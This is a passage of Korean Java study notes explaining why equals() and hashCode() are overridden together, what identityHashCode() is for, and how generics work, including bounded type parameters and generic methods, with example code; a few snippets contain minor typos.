그래서 마치 추상 메서드 처럼 정의 되어 있는 것이다.
```

```
#)hashCode 오더라이딩
위에서 equals()메소드 오버라이딩하였던 코드를 직접 실행해보면 아마 아래와 같은
경고문구를 봤을것이다.

Class Person overrides equals, but neither~

즉, equals는 오버라이딩하면 왜 hashCode()는 오버라이딩 안햐냐는 것이다.

경고가 뜨는 이유는, 만일 객체의 주소가 아닌 객체의 필드값을 비교하기 위해 equals를
오버라이딩 시킨다면 당연히 hashCode도 같이 객체의 필드를 다루도록 오버라이딩해야되기 떄문이다.

왜냐하면 equals()의 결과가 true인 두객체의 해시코드는 반드시 같아야한다는 자바의 규칙때문이다.


equals와 hashCode는 같이 재정의하라는 말을 다들 한 번쯤 들어봤을 것이다.

대부분의 IDE Generate 기능에서도 equals와 hashCode를 같이 재정의해준다.

그렇다면 equals와 hashCode를 왜 같이 재정의해야 하는 걸까? 

결론부터 말하자면 두 메소드를 재정의 하지 않을시, hash 값을 사용하는 
Collection Framework(HashSet, HashMap, HashTable)을 사용할 때 문제가 발생하기 때문이다. 
이에 대해서 차근차근 알아보도록 하자.
```

```
#)equals만 재정의 할경우
Person클래스에는 equals메소드만 오버라이딩하였다.
따라서 p1,p2객체는 해시코드가 다름에도 불구하고 논리적으로 같은객체로 판단된다.

class Person {
    public String name;

    public Person(String name) {
        this.name = name;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        Person p = (Person) o;
        return Objects.equals(name, p.name); //논리적으로 name이 같으면 같은 것으로 간주
    }
}

public class ClassTest {
    public static void main(String[] args) throws Exception {
        Person p1 = new Person("홍길동");
        Person p2 = new Person("홍길동");

        // 두 객체의 해시 코드
        System.out.println(p1.hashCode()); // 460141958
        System.out.println(p2.hashCode()); // 1163157884

        // 해시코드가 달라도, name을 기준으로 equals를 재정의 했기 때문에 동등함
        System.out.println(p1.equals(p2)); // true

        // 리스트를 생성하고 두 객체 데이터를 추가한다.
        List<Person> people = new ArrayList<>();
        people.add(p1);
        people.add(p2);
        
        // 그리고 리스트의 길이를 출력한다.
        System.out.println(people.size()); // 2
    }
}
```
```
그렇다면 이번엔 List 자료형 대신 중복된 값을 혀용하지 않는 리스트인
Set 자료형을 이용해보자.

Collection에 중복되지 않는 Person 객체만 넣으라는 요구사항이 추가되었다. 
요구사항을 반영하기 위해 ArrayList에서 중복 값을 허용하지 않는 HashSet으로 로직을 바꿨다.

로직의 결과를 예상해보자면, 우리는 Person 객체의 name 문자열이 같으면 같은 객체로 판별하도록 
equals 메서드를 재정의 하였었다. 
따라서 같은 이름을 가진 p1과 p2 객체를 HashSet 자료형에 넣는다면 중복 판별되어 하나의 데이터만
컬렉션에 들어가 있어야 한다.
그러나 HashSet의 size가 1이 나올 거라 예상했지만, 
예상과 다르게 그대로 2가 출력된다.
p1과 p2는 논리적으로 같다고 정의하였지만 해시코드!!!!!가 다르기 때문에 중복된 데이터가 컬렉션에 추가된 것이다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/51.PNG" width="650" height="300" /><br><br>

```
가장 먼저 데이터가 추가된다면, 그 데이터의 hashCode()의 리턴값을 컬렉션에 가지고 있는지 비교한다.
(아래 코드참조)

만일 해시코드가 같다면(함수 재정의해야됨) 그제서야 다음으로 equals() 메서드의 리턴값을
비교하게 되고, true이면 논리적으로 같은 객체라고 판단한다.

위의 예제 코드에서 HashSet에 Person 객체를 추가할 때도 위와 같은 과정으로 중복 여부를 판단하고
HashSet에 추가되게 된다. 
이때 Person 클래스에는 hashCode 메서드가 재정의 되어있지 않아서 
Object 클래스의 hashCode 메서드가 사용되었고 객체마다 다른 값을 리턴하였다.

결국 두 개의 p1 과 p2 객체는 equals로 비교도 하기 전에 
서로 다른 hashCode 메서드의 리턴 값으로 인해 다른 객체로 판단되어 
무지성으로 컬렉션에 적재한 것이다.

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/52.PNG" width="650" height="300" /><br><br>

```
따라서 이러한 오작동을 방지하기 위해 hashCode 메서드도 재정의하여
두 객체의 필드인 name의 문자열값이 같을 경우 해시코드를 갖게 하도록
재구성할 필요가 있다.

Tip) 다른 컬렉션 자료형인 HashMap 자료형에서도 key값을 새로 입력할 때 기존의 중복되는 키가
있는지 확인 하는데, 이때 hashCode 를 먼저 비교하고, 
둘이 같으면 그 다음에서야 equals 를 이용해 검사한다. 
그래서 equals 를 다른 필드를 비교하도록 재정의하였다면 
equals가 제대로 동작하게 하기위해선 hashCode 메소드도 재정의해야 한다.
```
```
#)equals 와 hashCode 동시 재정의
앞서 살펴봤던 문제를 해결하기 위해 Person클래스에 hashCode 메서드를 재정의하였다.

이때 반환되는 해시코드값을 객체의 주소값이 아닌 Person객체의 name필드의
문자열 값을 이용해 해시코드를 반환하도록 한다.

[ Objects.hash() 메서드 ]
매개변수로 주어진 값들을 이용해서 고유한 해시 코드를 생성한다.
즉, 동일한 값을 가지는 객체들의 필드로 해시코드를 생성하게 되면, 
동일한 해시코드를 가질 수 있게 되어, 
이 해시코드 값을 기준으로 재정의한 equals() 가 동등 비교에 이용한다고 보면 된다.
보통 이 메서드는 클래스가 hashCode()를 재정의할 때 리턴값을 생성하기 위해서 사용된다. 
(다만 속도가 느림)
```
```
class Person {
	public String name;

	public Person(String name) {
		this.name = name;
	}

	@Override
	public boolean equals(Object o) {
		if(this == o) return true;
		if(o == null || getClass() != o.getClass()) return false;
		Person p = (Person) o;
		return Objects.equals(name,p.name);
	}

	@Override
	public int hashCode() {
		return Objects.hash(name); //name필드의 해시코드를 반환한다.
	}
}

public class ClassTest {
	public static void main(String[] args) throws Exception {
		Person p1 = new Person("홍길동");
		Person p2 = new Person("홍길동");

		//두 객체의 해시코드
		System.out.println(p1.hashCode()); //54150093
		System.out.println(p2.hashCode()); //54150093
	
		//해시코드가 달라도, equals를 재정의 했기 때문에 동등함
		System.out.println(p1.equals(p2)); //true

		Set<Person> people = new HashSet<>();
		people.add(p1);
		people.add(p2);

		System.out.println(people.size()); //1 (같은객체로 보니까 1로나온다.)
	}
}

hashCode메서드를 재정의함에 따라, 두 객체의 해시코드는 같은 값이 나오는걸 볼 수 있고,
Set 자료형에도 중복된 데이터 적재로 판단되어 한번만 추가됨을 볼 수 있다.

Tip) 일반적인 String 타입이나 자바에서 미리 만들어놓은 
객체 데이터를 적재할때는 문제가 되지 않는다.
문제는 위의 Person 객체와 같이 사용자 정의 클래스 자료형을 만들어 사용할때 
equals 와 hashCode를 재정의 하지 않으면 오작동이 일어날수 있다는 점이다. 
이 점을 잘 숙지하자.
```
```
#)identityHashCode 메소드
hashCode() 메소드의 본래의 목적은 객체의 주소값을 기반으로 해싱해서 고유한 숫자값을
반환하는 것이다. 이를 통해 객체가 같은지 판별 할 수 있다.

그런데 위와 같이 equals() 와 hashCode() 메서드를 오버라이딩 해버리면, \반환 동작이 객체의 필드를 기준으로 이행되기 때문에, 
만일 객체 자체의 주소값(해시코드)를 얻어야 할 상황이 온다면 난감해 질 수 있다.
 
그래서 자바에서는 똑같이 해시코드를 반환해주는 
또다른 메서드인 identityHashCode() 를 만들었다.
즉, hashCode() 를 오버라이딩 해서 쓰는데, 
오버라이딩 하기 전의 원조 기능이 필요할때 사용 하는 메서드라고 보면 된다.

아래 코드에서는 Person 클래스는 name 필드의 문자열의 내용이 같으면 동일한 해시코드를
반환하도록 hashCode() 메서드를 재정의 하였기 때문에, 
같은 문자열들에 대해 hashCode() 를 호출하면 항상 동일한 코드값을 얻는다.

반면에 System.identityHashCode() 는 따로 독립된 시스템 메서드이기 때문에 
모든 객체에 대해 항상 다른 해시 코드값을 반환할 것을 보장한다. 
```
```
//이클립스 툴을 이용해서 getter,setter생성할때 보면
//Generate hashCode() and equals() 가 있다 그거를 통해서 생성해도된다.
//그러면 equals, hashcode가 아래와 같이 만들어진다.
class Person {
	String name;

	public Person(String name) {
		this.name = name;
	}

	public boolean equals(Object o) {
		if(this == o) return true;
		if(!(o instanceOf Person)) return false;
		Person person = (Person) o;
		return Objects.equals(this.name, person.name);
	}
	public int hashCode() {
		return Object.hash(name);
	}
}

public class Main {
	public static void main(String[] args) {
		Person p1 = new Person("홍길동");
        Person p2 = new Person("홍길동");

        // equals() 와 hashCode() 를 오버라이딩 했기에 
		두 객체 필드 name의 해시코드가 반환되어 같다.
        System.out.println(p1.hashCode()); // 54150093
        System.out.println(p2.hashCode()); // 54150093

        // 따라서 순수 객체의 주소를 얻고 싶다면 identityHashCode() 를 사용해야 한다.
    	System.out.println("System.identityHashCode(p1) : " + System.identityHashCode(p1)); // System.identityHashCode(p1) : 622488023
		System.out.println("System.identityHashCode(p2) : " + System.identityHashCode(p2)); // System.identityHashCode(p2) : 414493378
	}
}
```
```
#)제네릭이란
자바에서 제네릭(Generics)은 클래스 내부에서 사용할 데이터 타입을 외부에서 지정하는 기법을
의미한다. 객체별로 다른 타입의 자료가 저장될 수 있도록 한다.

자바에서 배열과 함께 자주 쓰이는 자료형이 리스트(List)인데, 
다음과 같이 클래스 선언 문법에 꺾쇠 괄호 <> 로 되어있는 코드 형태를 한번 쯤은 봤을 것이다.

ArrayList<String> list = new ArrayList<>();

저 꺽쇠괄호가 바로 제네릭이다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/53.PNG" width="650" height="300" /><br><br>

```
이처럼 제네릭은 배열의 타입을 지정하듯이 리스트 자료형 같은 
컬렉션 클래스나 메소드에서 사용할 내부 데이터 타입(type)을 파라미터(parameter) 주듯이 
외부에서 지정하는 이른바 타입을 변수화 한 기능이라고 이해하면 된다.

Tip)우리가 변수를 선언할 때 변수의 타입을 지정해주듯이, 제네릭은 객체(Object)에
타입을 지정해주는 것이라고 보면 된다.
```
```
#)제네릭 타입 매개변수
위에서 보다시피, 제네릭은 <> 꺾쇠 괄호 키워드를 사용하는데 이를 다이아몬드 연산자라고 한다.
그리고 이 꺾쇠 괄호 안에 식별자 기호를 지정함으로써 파라미터화 할 수 있다. 
이것을 마치 메소드가 매개변수를 받아 사용하는 것과 비슷하여 
제네릭의 타입 매개변수(parameter) / 타입 변수 라고 부른다.

```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/54.PNG" width="650" height="300" /><br><br>

```
#)타입 파라미터 정의
이 타입 매개변수는 제네릭을 이용한 클래스나 메소드를 설계할 때 사용된다.

예를들어 다음 코드는 제네릭을 감미한 클래스를 정의한 코드이다. 
클래스명 옆에 <T> 기호로 제네릭을 붙여준 걸 볼 수 있다. 
그리고 클래스 내부에서 식별자 기호 T 를 클래스 필드와, 
메소드의 매개변수의 타입으로 지정되어 있다. -> add(T fruit)

class FruitBox<T> {
	List<T> fruits = new ArrayList<>();

	public void add(T fruit) {
		fruits.add(fruit);
	}
}

제네릭 클래스를 만들었으면 이를 인스턴스화 해보자.
마치 파라미터를 지정해서 보내는 것 처럼 생성 코드에서 
꺾쇠 괄호 안에 지정해주고 싶은 타입명을 할당해주면,
제네릭 클래스 선언문 부분으로 가서 타입 파라미터 T 가 지정된 타입으로 
모두 변환되어 클래스의 타입이 지정되게 되는 것이다.

// 제네릭 타입 매개변수에 정수 타입을 할당
FruitBox<Integer> intBox = new FruitBox<>(); 

// 제네릭 타입 매개변수에 실수 타입을 할당
FruitBox<Double> intBox = new FruitBox<>(); 

// 제네릭 타입 매개변수에 문자열 타입을 할당
FruitBox<String> intBox = new FruitBox<>(); 

// 클래스도 넣어줄 수 있다. (Apple 클래스가 있다고 가정)
FruitBox<Apple> intBox = new FruitBox<Apple>();
```
```
#)타입파라미터 생략
제네릭 객체를 사용하는 문법 형태를 보면 
양쪽 두 군데에 꺾쇠 괄호 제네릭 타입을 지정함을 볼 수 있다. 
하지만 맨 앞에서 클래스명과 함께 타입을 지정해 주었는데 
굳이 생성자까지 제네릭을 지정해 줄 필요가 없다. (중복)

따라서 jdk 1.7 버전 이후부터,  
new 생성자 부분의 제네릭 타입을 생략할 수 있게 되었다. 
제네릭 나름대로 타입 추론을 해서 생략 된 곳을 넣어주기 때문에 문제가 없는 것이다.

FruitBox<Apple> intBox = new FruitBox<Apple>();

//아래와 같이 new 생성자 부분의 제네릭의 타입 매개변수는 생략할 수 있다.
FruitBox<Apple> intBox = new FruitBox<>();
```
```
#)타입 파라미터 할당 가능 타입
제네릭에서 할당 받을 수 있는 타입은 Reference타입 뿐이다.
즉, int,double 형 같은 자바 원시타입(Primitive Type)을 제네릭 타입 파라미터로 넘길 수 없다.

우리가 Wrapper 클래스Visit Website에 대해 공부할때 int형, double형이 이미 존재하는데, 
왜 굳이 똑같은 역할을 하는 Integer형, Double형 클래스를 만들어놨을까 
고민을 해본적이 있었을 것이다. 
바로 이때 사용하는 것이라고 이해하면 된다.
바로 적응이 되지는 않겠지만, 객체 지향 프로그래밍에서는 모든 것이 객체로 통신하기 때문에
번거롭더라도 익숙해 지어야 한다.

// 기본 타입 int는 사용 불가 !!!
List<int> intList = new List<>(); 

// Wrapper 클래스로 넘겨주어야 한다. (내부에서 자동으로 언박싱되어 원시 타입으로 이용됨)
List<Integer> integerList = new List<>();

또한 제네릭 타입 파라미터에 클래스가 타입으로 온다는 것은, 
클래스끼리 상속을 통해 관계를 맺는 객체 지향 프로그래밍의 
다형성 원리가 그대로 적용이 된다는 소리이다.

아래 예제 코드를 보면 타입 파라미터로 <Fruit> 로 지정했지만 업캐스팅을 통해 
그 자식 객체도 할당이 됨을 볼 수 있다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/55.PNG" width="650" height="300" /><br><br>

```
class Fruit {}
class Apple extends Fruit {}
class Banana extends Fruit {}

class FruitBox<T> {
	List<T> fruits = new ArrayList<>();

	public void add(T fruit) {
		fruits.add(fruit);
	}
}

public class Main {
	public static void main(String[] args) {
		FruitBox<Fruit> box  = new FruitBox<>();

		//제네릭 타입은 다형성원리가 그대로 적용된다.
		box.add(new Fruit());
        box.add(new Apple());
        box.add(new Banana());
	}
}

```
```
#)복수 타입 파라미터
제네릭은 반드시 한개만 사용하라는 법은 없다.
만일 타입 지정이 여러개가 필요한 경우 2,3개 얼마든지 만들 수 있다.

제네릭 타입의 구분은 꺽쇠 괄호 안에서 쉽표(,)로 하며 
<T, U> 와 같은 형식을 통해 복수 타입 파라미터를 지정할 수 있다. 
그리고 당연히 클래스 초기화할때 제네릭 타입을 두개를 넘겨주어야 한다.

import java.util.ArrayList;
import java.util.List;

class Apple {}
class Banana {}

class FruitBox<T, U> {
    List<T> apples = new ArrayList<>();
    List<U> bananas = new ArrayList<>();

    public void add(T apple, U banana) {
        apples.add(apple);
        bananas.add(banana);
    }
}

public class Main {
    public static void main(String[] args) {
    	// 복수 제네릭 타입
        FruitBox<Apple, Banana> box = new FruitBox<>();
        box.add(new Apple(), new Banana());
        box.add(new Apple(), new Banana());
    }
}

```
```
#)중첩 타입 파라미터
제네릭 객체를 제네릭 타입 파라미터로 받는 형식도 표현할 수 있다.

ArrayList자체도 하나의 타입으로써 제네릭 타입 파라미터가 될 수 있기 때문에
이렇게 중첩 형식으로 사용할 수 있는 것이다.

public static void main(String[] args) {
    // LinkedList<String>을 원소로서 저장하는 ArrayList
    ArrayList<LinkedList<String>> list = new ArrayList<LinkedList<String>>();

    LinkedList<String> node1 = new LinkedList<>();
    node1.add("aa");
    node1.add("bb");

    LinkedList<String> node2 = new LinkedList<>();
    node2.add("11");
    node2.add("22");

    list.add(node1);
    list.add(node2);
    System.out.println(list); //[[aa, bb], [11,22]]
}
```
```
#)타입 파라미터 기호 네이미
지금까지 제네릭 기호를 <T> 와 같이 써서 표현했지만 
사실 식별자 기호는 문법적으로 정해진 것이 없다.

다만 우리가 for문을 이용할때 루프 변수를 i 로 지정해서 사용하듯이, 
제네릭의 표현 변수를 T 로 표현한다고 보면 된다. 
만일 두번째, 세번째 제네릭이 필요하다고 보면 for문의 j나 k 같이 S, U 로 이어나간다.

명명하고 싶은대로 아무 단어나 넣어도 문제는 없지만, 
대중적으로 통하는 통상적인 네이밍이 있으면 
개발이 용이해 지기 때문에 아래 표화 같은 암묵적인 규칙(convention)이 존재한다. 
예를들어 예제에서 사용된 T 를 타입 변수(type variable)라고 하며, 임의의 참조형 타입을 의미한다.

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/56.PNG" width="650" height="300" /><br><br>

```
#)제네릭 사용 이유와 이점
1. 컴파일 타임에 타입 검사를 통해 예외 방지

자바에서 제네릭(Generic)은 자바 1.5에 추가된 스펙이다. 
그래서 JDK 1.5 이전에서는 여러 타입을 다루기 위해 
인수나 반환값으로 Object 타입을 사용했었었다. 

하지만 Object로 타입을 선언할 경우 반환된 Object 객체를 다시 
원하는 타입으로 일일히 타입 변환을 해야 하며, 
런타임 에러가 발생할 가능성도 존재하게 된다.
아래 예제에선 Object 타입으로 선언한 배열에 Apple 과 Banana 객체 타입을 저장하고 
이를 다시 가져오는 예제이다.


class Apple {}
class Banana {}
class FruitBox {
	//모든 클래스 타입을 받기 위해 최고 조상인 Object타입으로 설정
	private Object[] fruit;

	public FruitBox(Object[] fruit) {
		this.fruit = fruit;
	}

	public Object getFruit(int index) {
		return fruit[index];
	}
}
public static void main(String[] args) {
	Apple[] arr = {
		new Apple(),
		new Apple()
	};
	FruitBox box = new FruitBox(arr);

	Apple apple = (Apple) box.getFruit(0);

	//에러발생원인(box에 있는 건 Apple인데 Banana로 가져올려고)
	Banana banana = (Banana) box.getFruit(1); 
}
실행해 보면 ClassCaseException 런타임 에러가 발생한다.
코드에서는 안알려준다. 
```
```
그래서 제네릭을 이용하면 이런 어처구니 없는 실수를 미연에 방지를 할 수 있다.
왜냐하면 코드를 실행하기전 컴파일타임에 미리 에러를 찾아 알려주기 때문이다.

class FruitBox<T> {
	private T[] fruit;

	public FruitBox(T[] fruit) {
		this.fruit = fruit;
	}
	public T getFruit(int index) {
		return fruit[index];
	}
}
public static void main(String[] args) {
	Apple[] arr = {
		new Apple(),
		new Apple()
	};
	//FruitBox클래스는 무엇이든 받는 클래스이다.
	FruitBox<Apple> box = new FruitBox<>(arr);

	Apple apple = (Apple)box.getFruit(0);
	//여기서 컴파일 타임에 미리 잘못된 것을 알려준다. 제네릭때문에
	Banana banana = (Banana) box.getFruit(1);
}

```
```
2. 불필요한 캐스팅을 없애 성능 향상
위의 예제 코드에서 Apple 배열을 FruitBox의 Object 배열 객체에 넣고,
배열요소를 가져올 때 반드시 다운캐스팅을 통해 가져와야 했다.
이는 곧 추가적인 오버레드가 발생하는것과 같다.
//배열길이는 제한없이
Apple[] arr = {new Apple(), new Apple(), new Apple()}
FruitBox box = new FruitBox(arr);

//가져온 타입이 Object 타입이기 때문에 일일히 다운캐스팅을 해야함. - 쓸데없는 성능 낭비
Apple apple1 = (Apple) box.getFruit(0);
Apple apple2 = (Apple) box.getFruit(1);
Apple apple3 = (Apple) box.getFruit(2);  
```
```
반면, 제네릭은 미리 타입을 지정 & 제한해 놓기 때문에 형변환의 번거러움을 줄일 수 있으며,
타입검사에 들어가는 메모리를 줄일 수 있고 가독성도 좋아진다.

//미리제네릭 타입파라미터를 통해 형(type)을 지정해놓았기 때문에 별도의 형변환 필요없다.
FruitBox<Apple> box = new FruitBox<>(arr);

Apple apple = box.getFruit(0);
Apple apple = box.getFruit(1);
Apple apple = box.getFruit(2);
```
```
#)제네릭 사용주의사항
1. 제네릭 타입의 객체는 생성이 불가
class Sample<T> {
	public void someMethod() {
		T t = new T();
	}
}


2. static멤버에 제네릭 타입이 올 수 없음
왜냐하면 static 멤버는 클래스가 동일하게 공유하는 변수로서 제네릭객체가 생성되기도 전에
이미 자료 타입이 정해져있어야 하기 때문이다.
즉, 논리적인 오류이다.

class Student<T> {
	private String name;
	private int age = 0;

	//static 메서드의 반환타입으로 사용불가
	public static T addAge(int n) {

	}
}

class Student<T> {
	private String name;
	private int age = 0;

	//static 메서드의 매개변수 타입으로 사용불가
	public static void addAge(T n) {

	}
}

3.제네릭으로 배열선언 주의점
기본적으로 제네릭 클래스 자체를 배열로 만들 수는 없다.

class Sample<T> {
}

public class Main {
	public static void main(String[] args) {
		Sample<Integer>[] arr1 = new Sample<>[10]; //여기서 차이가 난다.(꺽새의 차이)
	}
}
하지만 제네릭 타입의 배열 선언은 허용된다.

위의 식과 차이점은 배열에 저장할 Sample 객체의 타입 파라미터를 Integer 로 지정한다는 뜻이다. 
즉, new Sample<Integer>() 인스턴스는 저장이 가능하며, 
new Sample<String>() 인스턴스는 저장이 불가능하다는 소리이다.

class Sample<T> {
}

public class Main {
	public static void main(String[] args) {
		//new Sample<Integer>() 인스턴스만 저장하는 배열을 나타냄
		Sample<Integer>[] arr2 = new Sample[10];

		//제네릭 타입을 생략해도 위에서 이미 정의했기 때문에 Integer가 자동으로 추론됨
		arr2[0] = new Sample<Integer>();
		arr2[1] = new Sample<>();

		// Integer가 아닌 타입은 저장 불가능
		arr2[2] = new Sample<String>();
	}
}
```
```
#)제네릭 객체 만들어 보기
제네릭을 이용해 직접 클래스와 인터페이스, 메서드를 만들어보고 사용해보자

- 제네릭 클래스
class Sample<T> {
	private T value;

	public T getValue() {
		return value;
	}

	public void setValue(T value) {
		this.value = value;
	}
}

public static void main(String[] args) {
	//정수형을 다루는 제네릭 클래스
	Sample<Integer> s1 = new Sample<>();
	s1.setValue(1);

	//실수형을 다루는 제네릭 클래스
	Sample<Double> s2 = new Sample<>();
	s2.setValue(1.0);

	//문자열을 다루는 제네릭 클래스
	Sample<String> s3 = new Sample<>();
	s3.setValue("1");
}
```
```
#)제네릭 인터페이스
- 인터페이스에도 제네릭을 적용 할 수 있다. 
단, 인터페이스를 implements 한 클래스에서도 
오버라이딩한 메서드를 제네릭 타입에 맞춰서 똑같이 구현해 주어야 한다.

interface ISample<T> {
	public void addElement(T t, int index);
	public T getElement(int index);
}

class Sample<T> implements ISample<T> {
	private T[] array; //T자료형의 배열

	//생성자
	public Sample() {
		array = (T[]) new Object[10];
	}

	@Override
	public void addElement(T element, int index) {
		array[index] = element;
	}

	@Override
	public T getElement(int index) {
		return array[index];
	}
}

public static void main(String[] args) {
	//타입이 String
	Sample<String> sample = new Sample<>();
	sample.addElement("This is string",5); //5번째 인덱스에 넣어라
	sample.getElement(5);
}
```
```
#)제네릭 함수형 인터페이스
특히 제네릭 인터페이스가 정말 많이 사용되는 곳이 바로 람다 표현식의 함수형 인터페이스이다. 
아직 자바의 람다식에 대해 배우지 않은 독자분들도 계시겠지만, 
앞으로 배울 예정일 것이니 람다 함수와 제네릭의 응용 형태를 눈에 익히고 가는것을 추천하는 바다.

//제네릭으로 타입을 받아, 해당 타입의 두 값을 더하는 인터페이스
interface IAdd<T> {
	public T add(T x, T y); //T자료형으로 반환
}

public class Main {
	public static void main(String[] args) {
		//제네릭을 통해 람다 함수의 타입을 결정
		//매개변수 x,y 그리고 반환형 타입이 int형으로 설정된다.
		IAdd<Integer> o = (x,y) -> x+y; 

		int result = o.add(10,20);
		System.out.println(result); //30
	}
}

```
```
#)제네릭 메서드
제네릭 메서드 부분은 제네릭 클래스, 인터페이스와 달리 난이도가 조금 있다.

아래와 같이 제네릭 클래스에서 제네릭 타입 파라미터를 사용하는 메서드를 
제네릭 메서드라고 착각하기 쉬운데, 
이것은 그냥 타입 파라미터로 타입을 지정한 메서드 일 뿐이다.

class FruitBox<T> {
	public T addBox(T x, T y) {

	}
}
```
```
제네릭 메서드란, 메서드의 선언부에 <T>가 선언된 메서드를 말한다.

위에서는 클래스의 제네릭 <T> 에서 설정된 타입을 받아와 반환 타입으로 
사용할 뿐인 일반 메서드라면, 
제네릭 메서드는 직접 메서드에 <T> 제네릭을 설정함으로서 
동적으로 타입을 받아와 사용할 수 있는 독립적으로 운용 가능한 제네릭 메서드라고 이해하면 된다.

class FruitBox<T> {
	//위에 있는 클래스의 타입 파라미터를 받아와 사용하는 일반 메서드
	public T addBox(T x, T y) {
	}

	//독립적으로 타입 할당 운영되는 제네릭 메서드
	public static <T> T addBoxStatic(T x, T y) {
	}
}
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/57.PNG" width="650" height="300" /><br><br>

```
#)제네릭 메서드 호출 원리
제네릭 타입을 메서드명 옆에 지정해줬으니, 
호출 역시 메서드 왼쪽에 제네릭 타입이 위치하게된다.

FruitBox.<Integer>addBoxStatic(1,2);
FruitBox.<String>addBoxStatic("안녕","잘가");

```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/58.PNG" width="650" height="300" /><br><br>

```
한가지 궁금한것이 있는데,
클래스 옆에 붙어있는 제네릭과 class Fruit<T> , 
제네릭메소드 public static <T> ~ 는 똑같은 <T>인데 어떻게 제네릭 메서드만이
독립적으로 운영되는지 말이다.

사실은 처음 제네릭 클래스를 인스턴스화하면, 
클래스 타입 매개변수에 전달한 타입에 따라 제네릭 메소드도 타입이 정해지게 된다. 
그런데 만일 제네릭 메서드를 호출할때 직접 타입 파라미터를 다르게 지정해주거나, 
다른 타입의 데이터를 매개변수에 넘긴하면 독립적인 타입을 가진 제네릭 메서드로 운용되게 된다.

class FruitBox<T,U> {
	//독립적으로 운영되는 제네릭 메서드
	public <T,U> void printBox(T x, U y) {
		//해당 매개변수의 타입 출력
		System.out.println(x.getClass().getSimpleName());
		System.out.println(y.getClass().getSimpleName());
	}
}
public static void main(String[] args) {
	FruitBox<Integer, Long> box1 = new FruitBox<>();

	//인스턴스화할때 지정된 타입 파라미터<Integer,Long>
	box1.printBox(1,1);

	//하지만 제네릭메서드는 똑같은 box1이지만 
	//위와다르게 다른타입파라미터를 지정하면 독립적으로 운용
	box1.<String,Double>printBox("hello",5.55);
	box1.printBox("hello",5.55); 

}
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/59.PNG" width="650" height="500" /><br><br>

```
#)제네릭 타입 범위 한정하기
제네릭에 타입을 지정해줌으로서 클래스의 타입을 컴파일 타임에서 정하여 
타입 예외에 대한 안정성을 확보하는 것은 좋지만 문제는 너무 자유롭다는 점이다.

예를들어 다음 계산기 클래스가 있다고 하자. 
정수, 실수 구분없이 모두 받을 수 있게 하기위해 제네릭으로 클래스를 만들어주었다. 
하지만 단순히 <T> 로 지정하게 되면 숫자에 관련된 래퍼 클래스 뿐만 아니라 String이나 다른
클래스들도 대입이 가능하다는 점이 문제이다.

class Calculator<T> {
	void add(T a, T b) {}
	void min(T a, T b) {}
	void mul(T a, T b) {}
	void div(T a, T b) {}
}
public class Main {
	public static void main(String[] args) {
		//제네릭에 아무타입이나 모두 할당이 가능
		Calculator<Number> cal1 = new Calculator<>();
		Calculator<Object> cal2 = new Calculator<>();
		Calculator<String> cal3 = new Calculator<>();
		Calculator<Main> cal4 = new Calculator<>();
	}
} 

개발자의 의도로는 계산기 클래스의 제네릭 타입 파라미터로 Number 자료형만 들어오도록 하고
문자열이나 또 다른 클래스 자료형이 들어오면 안되게 하고 싶다고 한다. 
그래서 나온 것이 제한된 타입 매개변수 (Bounded Type Parameter) 이다.

```
```
#)타입 한정 키워드 extends
기본적인 용법은 <T extends [제한타입]> 이다. 
제네릭 <T> 에 extends 키워드를 붙여줌으로써, 
<T extends Number> 제네릭을 Number 클래스와 그 하위 타입(Integer, Double)들만 
받도록 타입 파라미터 범위를 제한 한 것이다. 

Tip) 클래스의 상속 키워드와 제네릭의 타입 한정키워드가 둘다 똑같이 extends라
혼동할 소지가 다분이있다.
꺽쇠 괄호안에 extends가 있으면 이건 제한을 의미하여
괄호바깥에 있으면 상속으로 보면 된다.

class Calculator<T extends Number> {
	void add(T a, T b) {}
	void min(T a, T b) {}
	void mul(T a, T b) {}
	void div(T a, T b) {}
}

public class Main {
	public static void main(String[] args) {
		Calculator<Number> cal1 = new Calculator<>();
		Calculator<Integer> cal2 = new Calculator<>();
		Calculator<Double> cal3 = new Calculator<>();
	
		//Number 이외의 클래스들은 오류!
		Calculator<Object> cal1 = new Calculator<>();
		Calculator<String> cal2 = new Calculator<>();
		Calculator<Main> cal3 = new Calculator<>();
	}
}
```
```
#)인터페이스 타입 한정
interface Readable {
}

//인터페이스를 구현하는 클래스
public class Student implements Readable {
}

//인터페이스를 Readable를 구현한 Student 클래스만이 제네릭 가능
public class School <T extends Readable> {}

public static void main(String[] args) {
	//타입파라미터에 인터페이스를 구현한 클래스만이 올수있게된다(Student)
	School<Student> a = new School<Student>();
}
```
```
#)다중타입한정
만일 2개 이상의 타입을 동시에 상속(구현)한 경우로 타입 제한하고 싶다면,  
& 연산자를 이용하면 된다. 
해당 인터페이스들을 동시에 구현한 클래스가 제네릭 타입의 대상이 되게 된다.

